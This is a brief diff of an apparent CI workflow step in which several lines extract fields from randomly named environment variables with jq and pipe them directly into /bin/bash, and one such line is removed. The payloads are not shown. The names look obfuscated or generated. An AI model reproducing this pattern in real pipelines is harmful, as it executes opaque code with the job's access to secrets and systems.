@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$z9657" | jq -r .c32 | /bin/bash
           echo $ubyg50 | jq -r .sbbkk4034 | /bin/bash
-          printf '%s' "$phnug9538" | jq -r .guoln878 | /bin/bash
           printf '%s' "$cx21219" | jq -r .w782 | /bin/bash
           printf '%s' "$qt83" | jq -r .izc0 | /bin/bash
           printf '%s' "$sma88251" | jq -r .z1459 | /bin/bash
